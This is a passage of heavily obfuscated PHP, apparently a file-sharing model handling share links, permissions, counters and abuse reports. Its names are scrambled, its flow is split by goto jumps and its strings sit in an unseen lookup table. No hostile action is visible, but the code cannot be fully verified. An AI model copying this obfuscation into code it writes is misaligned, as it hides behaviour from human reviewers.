$aïêò×Œ²ˆ = Model($CÂ¸ƒÙùŠ»[553])->order($CÂ¸ƒÙùŠ»[383])->field($a‘Ÿí£óÅ)->where($DïâÉÏ‘¡ì)->select(); goto A›èô”öÖï; CÔ—£×îíæ: $CÂ¸ƒÙùŠ» =& $_SERVER[úÎü]; $Cˆ‚¢”˜ó = $this->where($DïâÉÏ‘¡ì)->find(); if (!$Cˆ‚¢”˜ó) { return !1; } goto a†‹†‹í§; aĞºîĞ„­: } protected function getInfoAuth($DÚ„ñ¯ÊÜ) { $eÁ…Â¯‘é¤ =& $_SERVER[úÎü]; $DŒÈÅ„ƒÂ = $this->getInfo($DÚ„ñ¯ÊÜ); $DŒÈÅ„ƒÂ[$eÁ…Â¯‘é¤[392]] = Model($eÁ…Â¯‘é¤[471])->authMake($DŒÈÅ„ƒÂ[$eÁ…Â¯‘é¤[1775]]); return $DŒÈÅ„ƒÂ; } protected function listData($AƒÔ’‚¨¼µ = null, $E¢°”éâ¶Ò = 300) { $d«Óã…™¶° =& $_SERVER[úÎü]; $Aª¬Å¿ÔÀ = array(array($d«Óã…™¶°[461] => array($d«Óã…™¶°[930], 0), $d«Óã…™¶°[463] => array($d«Óã…™¶°[930], 0), $d«Óã…™¶°[1776] => $d«Óã…™¶°[1733])); if ($AƒÔ’‚¨¼µ == $d«Óã…™¶°[1777]) { $Aª¬Å¿ÔÀ = array($d«Óã…™¶°[461] => 1); } else { if ($AƒÔ’‚¨¼µ == $d«Óã…™¶°[1016]) { $Aª¬Å¿ÔÀ = array($d«Óã…™¶°[463] => 1); } } $Aª¬Å¿ÔÀ[$d«Óã…™¶°[1485]] = USER_ID; $D‡Å‡Ğ’²‡ = $this->where($Aª¬Å¿ÔÀ)->selectPage($E¢°”éâ¶Ò); return $D‡Å‡Ğ’²‡; } protected function listToMe($eéŞàäçé = 300) { goto EÑÅ°†›ÂÊ; C á‹ÑÂÌ: $e±œ¢ñä» = $this->field($d†œ‰ÛÔ†‡)->where($D´½Ù´™œ—)->select(); foreach ($e±œ¢ñä» as $b°ÄÎ„÷í => &$CæÆ¥Ô‰Ù¡) { $CæÆ¥Ô‰Ù¡[$dî»…«±¢ì[1775]] = $a‰³‘…Á‡[$CæÆ¥Ô‰Ù¡[$dî»…«±¢ì[456]]]; } unset($CæÆ¥Ô‰Ù¡); goto Dİ±ÙÄğ³´; CÚĞºìõ´¯: if ($Bïƒ‡èÉ¡©) { $D´½Ù´™œ— = array(array($dî»…«±¢ì[538] => SourceModel::TYPE_USER, $dî»…«±¢ì[473] => USER_ID), array($dî»…«±¢ì[538] => SourceModel::TYPE_GROUP, $dî»…«±¢ì[473] => array($dî»…«±¢ì[7], $Bïƒ‡èÉ¡©)), $dî»…«±¢ì[1776] => $dî»…«±¢ì[1733]); } $Eˆó÷Ä†µß = Model($dî»…«±¢ì[553])->where($D´½Ù´™œ—)->selectPage($eéŞàäçé); $a‰³‘…Á‡ = array_to_keyvalue_group($Eˆó÷Ä†µß[$dî»…«±¢ì[361]], $dî»…«±¢ì[456]); goto FÈÀ‹Ò’“Î; FÈÀ‹Ò’“Î: if (!$a‰³‘…Á‡) { return $Eˆó÷Ä†µß; } $d†œ‰ÛÔ†‡ = $dî»…«±¢ì[1779]; $D´½Ù´™œ— = array($dî»…«±¢ì[456] => array($dî»…«±¢ì[400], array_keys($a‰³‘…Á‡))); goto C á‹ÑÂÌ; EÑÅ°†›ÂÊ: $dî»…«±¢ì =& $_SERVER[úÎü]; $Bïƒ‡èÉ¡© = Model($dî»…«±¢ì[1778])->userGroupParents(USER_ID); $D´½Ù´™œ— = array($dî»…«±¢ì[538] => SourceModel::TYPE_USER, $dî»…«±¢ì[473] => USER_ID); goto CÚĞºìõ´¯; Dİ±ÙÄğ³´: $E¡ÀÈá­Ì = array($dî»…«±¢ì[1780] => $e±œ¢ñä», $dî»…«±¢ì[1781] => $Eˆó÷Ä†µß[$dî»…«±¢ì[358]]); return $E¡ÀÈá­Ì; goto c…»½÷‚®; c…»½÷‚®: } protected function shareAdd($aí¼’íÛ°ñ, $c‘ßƒ·‘íº) { $aÉÑ–ÅÕ†ö =& $_SERVER[úÎü]; $AÔøôæ©äÂ = $this->_addShareData($aí¼’íÛ°ñ, $c‘ßƒ·‘íº); if (!empty($c‘ßƒ·‘íº[$aÉÑ–ÅÕ†ö[1782]])) { $this->_shareAuthSet($AÔøôæ©äÂ, $c‘ßƒ·‘íº[$aÉÑ–ÅÕ†ö[1782]]); } $this->shareEventAdd($aí¼’íÛ°ñ, $c‘ßƒ·‘íº, $aÉÑ–ÅÕ†ö[1019]); return $AÔøôæ©äÂ; } private function shareEventAdd($d´‘à¢êµ¡, $eÜ Óì , $D›¬…ˆñ = "\141\144\144") { goto a›ªåè§›; a›ªåè§›: $FÒ¸ã…ï²Ò =& $_SERVER[úÎü]; if ($D›¬…ˆñ == $FÒ¸ã…ï²Ò[1019]) { if ($eÜ Óì [$FÒ¸ã…ï²Ò[461]] == $FÒ¸ã…ï²Ò[83]) { Model($FÒ¸ã…ï²Ò[522])->eventShare($d´‘à¢êµ¡, $FÒ¸ã…ï²Ò[1783]); } if ($eÜ Óì [$FÒ¸ã…ï²Ò[463]] == $FÒ¸ã…ï²Ò[83]) { Model($FÒ¸ã…ï²Ò[522])->eventShare($d´‘à¢êµ¡, $FÒ¸ã…ï²Ò[1784]); } return; } $B¥øŠùëÛ = $this->getInfoByPath($d´‘à¢êµ¡); goto cëŒ°Âé‰í; cëŒ°Âé‰í: $Fö½ªÛŒ£¿ = $FÒ¸ã…ï²Ò[1785]; if ($B¥øŠùëÛ[$FÒ¸ã…ï²Ò[461]] == $FÒ¸ã…ï²Ò[485] && $eÜ Óì [$FÒ¸ã…ï²Ò[461]] == $FÒ¸ã…ï²Ò[83]) { $Fö½ªÛŒ£¿ = $FÒ¸ã…ï²Ò[1783]; } if ($B¥øŠùëÛ[$FÒ¸ã…ï²Ò[461]] == $FÒ¸ã…ï²Ò[83] && $eÜ Óì [$FÒ¸ã…ï²Ò[461]] == $FÒ¸ã…ï²Ò[485]) { $Fö½ªÛŒ£¿ = $FÒ¸ã…ï²Ò[1786]; } goto CËØ½šµÛ; CËØ½šµÛ: if ($B¥øŠùëÛ[$FÒ¸ã…ï²Ò[463]] == $FÒ¸ã…ï²Ò[485] && $eÜ Óì [$FÒ¸ã…ï²Ò[463]] == $FÒ¸ã…ï²Ò[83]) { $Fö½ªÛŒ£¿ = $FÒ¸ã…ï²Ò[1784]; } if ($B¥øŠùëÛ[$FÒ¸ã…ï²Ò[463]] == $FÒ¸ã…ï²Ò[83] && $eÜ Óì [$FÒ¸ã…ï²Ò[463]] == $FÒ¸ã…ï²Ò[485]) { $Fö½ªÛŒ£¿ = $FÒ¸ã…ï²Ò[1787]; } Model($FÒ¸ã…ï²Ò[522])->eventShare($d´‘à¢êµ¡, $Fö½ªÛŒ£¿); goto dÌĞ´ÛƒÄ†; dÌĞ´ÛƒÄ†: return; goto fŸã»µËÑ; fŸã»µËÑ: } private function _addShareData($d´”ê†šØ, $A´íªÚîö£ = array()) { goto aé¬¦ôº î; EŠ´Íƒ¾­»: $DĞ‚¾àÅÂÑ = array($Aß‰± àËÉ[1477] => USER_ID, $Aß‰± àËÉ[399] => $d´”ê†šØ, $Aß‰± àËÉ[1387] => $Aß‰± àËÉ[33], $Aß‰± àËÉ[461] => 0, $Aß‰± àËÉ[463] => 0, $Aß‰± àËÉ[1031] => $Aß‰± àËÉ[33], $Aß‰± àËÉ[301] => $Aß‰± àËÉ[33], $Aß‰± àËÉ[808] => $Aß‰± àËÉ[33], $Aß‰± àËÉ[1789] => 0, $Aß‰± àËÉ[1790] => 0, $Aß‰± àËÉ[464] => 0, $Aß‰± àËÉ[465] => $Aß‰± àËÉ[33], $Aß‰± àËÉ[458] => $Aß‰± àËÉ[33]); $AğÅ‰‰¨ê = explode($Aß‰± àËÉ[47], $Aß‰± àËÉ[1791]); foreach ($AğÅ‰‰¨ê as $f¬ìİĞçâ) { if (!isset($A´íªÚîö£[$f¬ìİĞçâ])) { continue; } $DĞ‚¾àÅÂÑ[$f¬ìİĞçâ] = $A´íªÚîö£[$f¬ìİĞçâ]; } goto B™·ŸºˆÇ; B™·ŸºˆÇ: $Aâ¶„­ëĞÂ = $this->add($DĞ‚¾àÅÂÑ); $bÈà®õ’“ = array($Aß‰± àËÉ[458] => short_id($Aâ¶„­ëĞÂ)); $this->where(array($Aß‰± àËÉ[455] => $Aâ¶„­ëĞÂ))->save($bÈà®õ’“); goto eĞê‡î’õ÷; eÕùÖ÷ÒÈ‘: if ($dÆñ¬ê¡…ö = $this->where($Dƒ·íá¡ë)->find()) { return $dÆñ¬ê¡…ö[$Aß‰± àËÉ[456]]; } if ($d´”ê†šØ == 0) { $FÓÁ„¿Š²‘ = array($Aß‰± àËÉ[28] => get_path_this($A´íªÚîö£[$Aß‰± àËÉ[75]])); } else { $FÓÁ„¿Š²‘ = Model($Aß‰± àËÉ[752])->sourceInfo($d´”ê†šØ); if (!$FÓÁ„¿Š²‘) { return !1; } } if (!$A´íªÚîö£[$Aß‰± àËÉ[1387]]) { $A´íªÚîö£[$Aß‰± àËÉ[1387]] = $FÓÁ„¿Š²‘[$Aß‰± àËÉ[28]]; } goto EŠ´Íƒ¾­»; aé¬¦ôº î: $Aß‰± àËÉ =& $_SERVER[úÎü]; $Dƒ·íá¡ë = array($Aß‰± àËÉ[399] => $d´”ê†šØ, $Aß‰± àËÉ[1477] => USER_ID); if ($d´”ê†šØ == 0) { $Dƒ·íá¡ë = array($Aß‰± àËÉ[1788] => $A´íªÚîö£[$Aß‰± àËÉ[1031]], $Aß‰± àËÉ[1477] => USER_ID); } goto eÕùÖ÷ÒÈ‘; eĞê‡î’õ÷: return $Aâ¶„­ëĞÂ; goto bçÒ“Š³õõ; bçÒ“Š³õõ: } private function _shareAuthSet($B¹²¤ªÁÂö, $eùå¿µ²Ñˆ) { goto BŸˆ®Š§Á¥; BŸˆ®Š§Á¥: $fŸœ‰Öáœî =& $_SERVER[úÎü]; if (!is_array($eùå¿µ²Ñˆ)) { return !1; } $f³©Î¬£•· = Model($fŸœ‰Öáœî[1792]); goto Fš¤¤ŞÔÉ; D„¡¶áÑø: return $f³©Î¬£•·->addAll($EÎ»Ûèìîù, array(), !0); goto e«İÚîÓŸ¡; Fš¤¤ŞÔÉ: $f³©Î¬£•·->where(array($fŸœ‰Öáœî[456] => $B¹²¤ªÁÂö))->delete(); $EÎ»Ûèìîù = array(); foreach ($eùå¿µ²Ñˆ as $c‹ã»Òœğ½) { $f¿ÆÄâñÛ = SourceModel::TYPE_USER; if ($c‹ã»Òœğ½[$fŸœ‰Öáœî[387]] == SourceModel::TYPE_GROUP) { $f¿ÆÄâñÛ = SourceModel::TYPE_GROUP; } $Eº¾ÙÕ„É = array($fŸœ‰Öáœî[456] => $B¹²¤ªÁÂö, $fŸœ‰Öáœî[387] => $f¿ÆÄâñÛ, $fŸœ‰Öáœî[473] => intval($c‹ã»Òœğ½[$fŸœ‰Öáœî[473]]), $fŸœ‰Öáœî[1793] => 0, $fŸœ‰Öáœî[1794] => -1); if ($c‹ã»Òœğ½[$fŸœ‰Öáœî[1793]]) { $Eº¾ÙÕ„É[$fŸœ‰Öáœî[1793]] = $c‹ã»Òœğ½[$fŸœ‰Öáœî[1793]]; } else { if ($c‹ã»Òœğ½[$fŸœ‰Öáœî[1794]]) { $Eº¾ÙÕ„É[$fŸœ‰Öáœî[1794]] = $c‹ã»Òœğ½[$fŸœ‰Öáœî[1794]]; } } $EÎ»Ûèìîù[] = $Eº¾ÙÕ„É; } goto D„¡¶áÑø; e«İÚîÓŸ¡: } public function numViewAdd($cëº›êŞê‡) { $dâºœ·ë‹â =& $_SERVER[úÎü]; $FÒŒæ¬¯¼ = array($dâºœ·ë‹â[455] => $cëº›êŞê‡); $this->where($FÒŒæ¬¯¼)->setAdd($dâºœ·ë‹â[1789]); } public function numDownloadAdd($FâŠñòñëĞ) { $Aœí‚†Å› =& $_SERVER[úÎü]; $a×´Îé»í‡ = array($Aœí‚†Å›[455] => $FâŠñòñëĞ); $this->where($a×´Îé»í‡)->setAdd($Aœí‚†Å›[1790]); } protected function shareEdit($E­šª·Á±¾, $A‘À¶„èóË) { goto A¨´“¨·¶Ò; a“É¤ğÍ„À: if (isset($A‘À¶„èóË[$C¶Ş…‹ [1782]])) { $this->_shareAuthSet($E­šª·Á±¾, $A‘À¶„èóË[$C¶Ş…‹ [1782]]); } return !0; goto e•å§øĞ®ğ; A•…–ŸˆŞî: foreach ($f¬â˜Ûß– as $e¼£ÖÓåÔÜ) { if (!array_key_exists($e¼£ÖÓåÔÜ, $A‘À¶„èóË)) { continue; } $føø‹…â«à[$e¼£ÖÓåÔÜ] = $A‘À¶„èóË[$e¼£ÖÓåÔÜ]; } $this->shareEventAdd($aÇªéËõÎÒ[$C¶Ş…‹ [385]], $A‘À¶„èóË, $C¶Ş…‹ [1611]); $this->where(array($C¶Ş…‹ [455] => $E­šª·Á±¾))->save($føø‹…â«à); goto a“É¤ğÍ„À; A¨´“¨·¶Ò: $C¶Ş…‹  =& $_SERVER[úÎü]; $aÇªéËõÎÒ = $this->getInfo($E­šª·Á±¾); if (!$aÇªéËõÎÒ) { return !1; } goto eé‰ÕÈá—Ã; eé‰ÕÈá—Ã: $this->_checkLinkShare($A‘À¶„èóË, $aÇªéËõÎÒ); $føø‹…â«à = array(); $f¬â˜Ûß– = explode($C¶Ş…‹ [47], $C¶Ş…‹ [1795]); goto A•…–ŸˆŞî; e•å§øĞ®ğ: } private function _checkLinkShare($D…¬³šƒÙŒ, $C’ëö“ƒØ«) { goto E¯¥Ó†ÔŞ; E¯¥Ó†ÔŞ: $E©Ìö¬Ş‹ =& $_SERVER[úÎü]; if ($D…¬³šƒÙŒ[$E©Ìö¬Ş‹[461]] != $E©Ìö¬Ş‹[83]) { return; } $A—ÙË¹Ó­ = $C’ëö“ƒØ«[$E©Ìö¬Ş‹[407]][$E©Ìö¬Ş‹[385]]; goto E÷É’ÒÕ¼Ä; B†Ùµ²åÍÕ: $E‚Š®Í³ä = $this->shareFileMeta($F¤ëšÅŞìî[$E©Ìö¬Ş‹[435]]); if (isset($E‚Š®Í³ä[$E©Ìö¬Ş‹[366]]) && $E‚Š®Í³ä[$E©Ìö¬Ş‹[366]] == $E©Ìö¬Ş‹[83]) { show_json(LNG($E©Ìö¬Ş‹[1798]), !1); } goto b¯Ü²Š¹É; E÷É’ÒÕ¼Ä: if ($C’ëö“ƒØ«[$E©Ìö¬Ş‹[407]][$E©Ìö¬Ş‹[29]] != $E©Ìö¬Ş‹[171]) { $c¹İÅÉÜ”Î = $this->_folderReport($A—ÙË¹Ó­); if (!$c¹İÅÉÜ”Î) { return; } show_json(LNG($E©Ìö¬Ş‹[1796]) . $E©Ìö¬Ş‹[1797] . $c¹İÅÉÜ”Î, !1); } $F¤ëšÅŞìî = Model($E©Ìö¬Ş‹[752])->fileInfoGet($C’ëö“ƒØ«[$E©Ìö¬Ş‹[407]][$E©Ìö¬Ş‹[385]]); if (!$F¤ëšÅŞìî) { return; } goto B†Ùµ²åÍÕ; b¯Ü²Š¹É: } private function _folderReport($aêèæ‡”) { goto A¡äáô‚â°; aà”æ£ºµ¶: $F¹«Ä¹Î‡ = array($Cö„«¤¯Ú[435] => array($Cö„«¤¯Ú[7], $Fùïø÷ª×†), $Cö„«¤¯Ú[476] => array($Cö„«¤¯Ú[373], "\45{$cµ¨ç‰­»}\45"), $Cö„«¤¯Ú[413] => 0); $dö“‹±÷ô¾ = Model($Cö„«¤¯Ú[752])->where($F¹«Ä¹Î‡)->field($Cö„«¤¯Ú[1800])->find(); if (!$dö“‹±÷ô¾) { return !1; } goto CÉÎ¨ê”“¦; A¡äáô‚â°: $Cö„«¤¯Ú =& $_SERVER[úÎü]; $F¹«Ä¹Î‡ = array($Cö„«¤¯Ú[435] => array($Cö„«¤¯Ú[930], 0), $Cö„«¤¯Ú[690] => 3); $Fùïø÷ª×† = Model($Cö„«¤¯Ú[1799])->where($F¹«Ä¹Î‡)->field($Cö„«¤¯Ú[435])->select(); goto a„±óÆäóÆ; CÉÎ¨ê”“¦: $báÇÇ£ŸÆÒ = substr($dö“‹±÷ô¾[$Cö„«¤¯Ú[476]], strpos($dö“‹±÷ô¾[$Cö„«¤¯Ú[476]], $cµ¨ç‰­»)); $F¹«Ä¹Î‡ = array($Cö„«¤¯Ú[385] => array($Cö„«¤¯Ú[7], trim($báÇÇ£ŸÆÒ, $Cö„«¤¯Ú[47]))); $c£Ìøè–ïÉ = Model($Cö„«¤¯Ú[752])->where($F¹«Ä¹Î‡)->field($Cö„«¤¯Ú[28])->select(); goto fù„×ëòÇœ; a„±óÆäóÆ: if (!$Fùïø÷ª×†) { return !1; } $Fùïø÷ª×† = array_to_keyvalue($Fùïø÷ª×†, $Cö„«¤¯Ú[33], $Cö„«¤¯Ú[435]); $cµ¨ç‰­» = $Cö„«¤¯Ú[47] . $aêèæ‡” . $Cö„«¤¯Ú[47]; goto aà”æ£ºµ¶; fù„×ëòÇœ: $e Ş½¯Å­Œ = array_to_keyvalue($c£Ìøè–ïÉ, $Cö„«¤¯Ú[33], $Cö„«¤¯Ú[28]); $e Ş½¯Å­Œ[] = $dö“‹±÷ô¾[$Cö„«¤¯Ú[28]]; return implode($Cö„«¤¯Ú[8], $e Ş½¯Å­Œ); goto d„œé½êÅ; d„œé½êÅ: } protected function remove($d‚¸Ò¶¡‡™) { goto D‹Ì£–­Ï; b›İ¢Õ©ùå: for ($b»ğÒ¯åÁ = 0; $b»ğÒ¯åÁ < count($CÕíôòÜÂÍ); $b»ğÒ¯åÁ++) { $c‚Á˜ñ¤˜‰ = $this->getInfo($CÕíôòÜÂÍ[$b»ğÒ¯åÁ]); if ($c‚Á˜ñ¤˜‰[$aÍº°áİ¾Š[463]] == $aÍº°áİ¾Š[83]) { Model($aÍº°áİ¾Š[522])->eventShare($c‚Á˜ñ¤˜‰[$aÍº°áİ¾Š[385]], $aÍº°áİ¾Š[1787]); } if ($c‚Á˜ñ¤˜‰[$aÍº°áİ¾Š[461]] == $aÍº°áİ¾Š[83]) { Model($aÍº°áİ¾Š[522])->eventShare($c‚Á˜ñ¤˜‰[$aÍº°áİ¾Š[385]], $aÍº°áİ¾Š[1786]); } } return $b•‰¨“¾á×; goto A¬µÔ´ˆ†; EÒğÄ‰šá: $b•‰¨“¾á× = $this->where($D· ãØÈ)->delete(); if ($b•‰¨“¾á×) { Model($aÍº°áİ¾Š[553])->where(array($aÍº°áİ¾Š[456] => $d‚¸Ò¶¡‡™))->delete(); } $CÕíôòÜÂÍ = is_array($d‚¸Ò¶¡‡™) ? $d‚¸Ò¶¡‡™[1] : array($d‚¸Ò¶¡‡™); goto b›İ¢Õ©ùå; D‹Ì£–­Ï: $aÍº°áİ¾Š =& $_SERVER[úÎü]; if (is_array($d‚¸Ò¶¡‡™)) { $d‚¸Ò¶¡‡™ = array($aÍº°áİ¾Š[7], $d‚¸Ò¶¡‡™); } $D· ãØÈ = array($aÍº°áİ¾Š[456] => $d‚¸Ò¶¡‡™); goto EÒğÄ‰šá; A¬µÔ´ˆ†: } protected function removeBySource($EÏ¢Í§ƒì‘) { goto b¾Õ«•ô±”; b¾Õ«•ô±”: $EÉ¿ƒöÌÇõ =& $_SERVER[úÎü]; $cŠÇ„—ÄÄ‹ = array($EÉ¿ƒöÌÇõ[399] => array($EÉ¿ƒöÌÇõ[400], $EÏ¢Í§ƒì‘)); $e¥©¥›± = $this->field($EÉ¿ƒöÌÇõ[456])->where($cŠÇ„—ÄÄ‹)->select(); goto fğ¦‚²Ä˜; fğ¦‚²Ä˜: $e¥©¥›± = array_to_keyvalue($e¥©¥›±, $EÉ¿ƒöÌÇõ[33], $EÉ¿ƒöÌÇõ[456]); if (!$e¥©¥›±) { return; } $cŠÇ„—ÄÄ‹ = array($EÉ¿ƒöÌÇõ[455] => array($EÉ¿ƒöÌÇõ[400], $e¥©¥›±)); goto cÏĞâ©í”‡; cÏĞâ©í”‡: $this->where($cŠÇ„—ÄÄ‹)->delete(); Model($EÉ¿ƒöÌÇõ[553])->where($cŠÇ„—ÄÄ‹)->delete(); goto Bã“ÑÃ; Bã“ÑÃ: } public function listAll($CÃÅ‚¶Ì¨²) { goto bØ§ì¹ÇÈ‚; bØ§ì¹ÇÈ‚: $FÁ´ãÆò…· =& $_SERVER[úÎü]; $CÚÈÛŠ¶ãç = array(); if ($CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[1485]]) { $CÚÈÛŠ¶ãç[$FÁ´ãÆò…·[1485]] = $CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[1485]]; } goto F„Ú·Úçİ; F„Ú·Úçİ: if ($CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[703]]) { $D®áŒ›— = $CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[464]] ? $CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[464]] : strtotime(date($FÁ´ãÆò…·[1801])); $CÚÈÛŠ¶ãç[$FÁ´ãÆò…·[190]] = array($FÁ´ãÆò…·[327], array($CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[703]], $D®áŒ›—)); } if ($CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[29]]) { $CÚÈÛŠ¶ãç[$CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[29]]] = 1; } else { $CÚÈÛŠ¶ãç[] = array($FÁ´ãÆò…·[461] => array($FÁ´ãÆò…·[930], 0), $FÁ´ãÆò…·[463] => array($FÁ´ãÆò…·[930], 0), $FÁ´ãÆò…·[1776] => $FÁ´ãÆò…·[1733]); } if ($CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[1729]]) { $CÚÈÛŠ¶ãç[] = array($FÁ´ãÆò…·[458] => $CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[1729]], $FÁ´ãÆò…·[1387] => array($FÁ´ãÆò…·[373], "\x25{$CÃÅ‚¶Ì¨²[$FÁ´ãÆò…·[1729]]}\x25"), $FÁ´ãÆò…·[1776] => $FÁ´ãÆò…·[1733]); } goto c­èÓÛè; DÈé‹•ñ±: return $aËÏ¿ªäªÈ; goto bíØÍ«²êÑ; c­èÓÛè: $aËÏ¿ªäªÈ = $this->_makeOrder()->where($CÚÈÛŠ¶ãç)->selectPage(20); if (empty($aËÏ¿ªäªÈ[$FÁ´ãÆò…·[361]])) { return array(); } $this->_listDataApply($aËÏ¿ªäªÈ[$FÁ´ãÆò…·[361]]); goto DÈé‹•ñ±; bíØÍ«²êÑ: } public function listDataApply($Eä­†ó”æî) { $this->_listDataApply($Eä­†ó”æî); return $Eä­†ó”æî; } private function _listDataApply(&$Dôº´ÃÂš‹) { goto CÕ°×’°¾; CÕ°×’°¾: $aßŞˆ‡ÎÍ‹ =& $_SERVER[úÎü]; $b³š¹±˜ = array_to_keyvalue($Dôº´ÃÂš‹, $aßŞˆ‡ÎÍ‹[33], $aßŞˆ‡ÎÍ‹[1485]); $A«§áŞÖ„ò = Model($aßŞˆ‡ÎÍ‹[494])->userListInfo(array_unique($b³š¹±˜)); goto Dè¬«Î˜à; Dè¬«Î˜à: $Bå¸•’°Šê = array_to_keyvalue($Dôº´ÃÂš‹, $aßŞˆ‡ÎÍ‹[33], $aßŞˆ‡ÎÍ‹[385]); $bÓùğ¤¡¯´ = Model($aßŞˆ‡ÎÍ‹[752])->sourceListInfo($Bå¸•’°Šê, !0); foreach ($Dôº´ÃÂš‹ as &$EÏÏ£ø¬Á) { $e¼ŸÉÛø² = $EÏÏ£ø¬Á[$aßŞˆ‡ÎÍ‹[1485]]; $EÏÏ£ø¬Á[$aßŞˆ‡ÎÍ‹[1802]] = $A«§áŞÖ„ò[$e¼ŸÉÛø²] ? $A«§áŞÖ„ò[$e¼ŸÉÛø²] : !1; $cá”áäØ»İ = $EÏÏ£ø¬Á[$aßŞˆ‡ÎÍ‹[385]]; $EÏÏ£ø¬Á[$aßŞˆ‡ÎÍ‹[407]] = $bÓùğ¤¡¯´[$cá”áäØ»İ] ? $bÓùğ¤¡¯´[$cá”áäØ»İ] : !1; } goto cİ”¿Ø¼ïò; cİ”¿Ø¼ïò: unset($EÏÏ£ø¬Á); goto c÷—ÍÉŠõ‰; c÷—ÍÉŠõ‰: } private function _makeOrder($fëÊ‹¬èÎº = '') { goto E‘‘ñˆÊéÊ; B·Üî¼ è: $fëÊ‹¬èÎº = $fëÊ‹¬èÎº . "{$e‚ì¼ï‰Ü¥}\40{$E»½…éˆ˜}"; return $this->order($fëÊ‹¬èÎº); goto B†ä‰ØãÅÉ; E‘‘ñˆÊéÊ: $fŒ¨·™®ˆ½ =& $_SERVER[úÎü]; $E¯Ë‰Ì†Ğ‹ = array($fŒ¨·™®ˆ½[190], $fŒ¨·™®ˆ½[464], $fŒ¨·™®ˆ½[1789], $fŒ¨·™®ˆ½[1790]); $F¨–ª‰œ«ö = array($fŒ¨·™®ˆ½[418] => $fŒ¨·™®ˆ½[419], $fŒ¨·™®ˆ½[420] => $fŒ¨·™®ˆ½[421]); goto a‡ÜÜ†ÔÁ; a‡ÜÜ†ÔÁ: $e‚ì¼ï‰Ü¥ = Input::get($fŒ¨·™®ˆ½[423], $fŒ¨·™®ˆ½[7], $fŒ¨·™®ˆ½[405], $E¯Ë‰Ì†Ğ‹); $E»½…éˆ˜ = Input::get($fŒ¨·™®ˆ½[424], $fŒ¨·™®ˆ½[7], $fŒ¨·™®ˆ½[1803], array($fŒ¨·™®ˆ½[1728], $fŒ¨·™®ˆ½[420])); $E»½…éˆ˜ = $F¨–ª‰œ«ö[$E»½…éˆ˜]; goto B·Üî¼ è; B†ä‰ØãÅÉ: } public function reportAdd($c ‡‡Ö‘º ) { $FÙ§ğ¿ÁÎØ =& $_SERVER[úÎü]; $DŞİƒĞğ“™ = array($FÙ§ğ¿ÁÎØ[456] => $c ‡‡Ö‘º [$FÙ§ğ¿ÁÎØ[456]], $FÙ§ğ¿ÁÎØ[1485] => USER_ID); if (Model($FÙ§ğ¿ÁÎØ[1799])->where($DŞİƒĞğ“™)->find()) { return !1; } $A¹ºÛáœ§ = array($FÙ§ğ¿ÁÎØ[456] => $c ‡‡Ö‘º [$FÙ§ğ¿ÁÎØ[456]], $FÙ§ğ¿ÁÎØ[1387] => $c ‡‡Ö‘º [$FÙ§ğ¿ÁÎØ[1387]], $FÙ§ğ¿ÁÎØ[385] => $c ‡‡Ö‘º [$FÙ§ğ¿ÁÎØ[385]], $FÙ§ğ¿ÁÎØ[435] => $c ‡‡Ö‘º [$FÙ§ğ¿ÁÎØ[435]], $FÙ§ğ¿ÁÎØ[1485] => USER_ID, $FÙ§ğ¿ÁÎØ[29] => $c ‡‡Ö‘º [$FÙ§ğ¿ÁÎØ[29]], $FÙ§ğ¿ÁÎØ[421] => $c ‡‡Ö‘º [$FÙ§ğ¿ÁÎØ[421]]); return Model($FÙ§ğ¿ÁÎØ[1799])->add($A¹ºÛáœ§); } public function reportList($d¬Ğ—÷È) { goto e¤á­’²«; e¤á­’²«: $fÀä¥İ¶İ¸ =& $_SERVER[úÎü]; $e¯áöè‚Çè = array(); if ($d¬Ğ—÷È[$fÀä¥İ¶İ¸[703]]) { $C÷ˆíÁÊİÂ = $d¬Ğ—÷È[$fÀä¥İ¶İ¸[464]] ? $d¬Ğ—÷È[$fÀä¥İ¶İ¸[464]] : strtotime(date($fÀä¥İ¶İ¸[1801])); $e¯áöè‚Çè[$fÀä¥İ¶İ¸[190]] = array($fÀä¥İ¶İ¸[327], array($d¬Ğ—÷È[$fÀä¥İ¶İ¸[703]], $C÷ˆíÁÊİÂ)); } goto C¾‚„£ŞŠ; F‡±°óÏÖù: $AŠÇ÷Òİ¥  = array($fÀä¥İ¶İ¸[418] => $fÀä¥İ¶İ¸[419], $fÀä¥İ¶İ¸[420] => $fÀä¥İ¶İ¸[421]); $aÒØõ†­Ë = $fÀä¥İ¶İ¸[1808] . $AŠÇ÷Òİ¥ [$DƒÚ‘¨ç²]; $d“ö‹‚“Ãî = Model($fÀä¥İ¶İ¸[1799])->where($e¯áöè‚Çè)->order($aÒØõ†­Ë)->selectPage(20); goto d¼ñô×Î¤; d¼ñô×Î¤: if (empty($d“ö‹‚“Ãî[$fÀä¥İ¶İ¸[361]])) { return array(); } $this->_listDataApply($d“ö‹‚“Ãî[$fÀä¥İ¶İ¸[361]]); return $d“ö‹‚“Ãî; goto Cå‘à¢ã®•; C¾‚„£ŞŠ: if (isset($d¬Ğ—÷È[$fÀä¥İ¶İ¸[29]]) && in_array($d¬Ğ—÷È[$fÀä¥İ¶İ¸[29]], array($fÀä¥İ¶İ¸[83], $fÀä¥İ¶İ¸[1804], $fÀä¥İ¶İ¸[1805], $fÀä¥İ¶İ¸[1806], $fÀä¥İ¶İ¸[1807]))) { $e¯áöè‚Çè[$fÀä¥İ¶İ¸[29]] = $d¬Ğ—÷È[$fÀä¥İ¶İ¸[29]]; } if (isset($d¬Ğ—÷È[$fÀä¥İ¶İ¸[690]]) && in_array($d¬Ğ—÷È[$fÀä¥İ¶İ¸[690]], array($fÀä¥İ¶İ¸[485], $fÀä¥İ¶İ¸[83], $fÀä¥İ¶İ¸[1804], $fÀä¥İ¶İ¸[1805]))) { $e¯áöè‚Çè[$fÀä¥İ¶İ¸[690]] = $d¬Ğ—÷È[$fÀä¥İ¶İ¸[690]]; } $DƒÚ‘¨ç² = Input::get($fÀä¥İ¶İ¸[424], $fÀä¥İ¶İ¸[7], $fÀä¥İ¶İ¸[1803], array($fÀä¥İ¶İ¸[1728], $fÀä¥İ¶İ¸[420])); goto F‡±°óÏÖù; Cå‘à¢ã®•: } 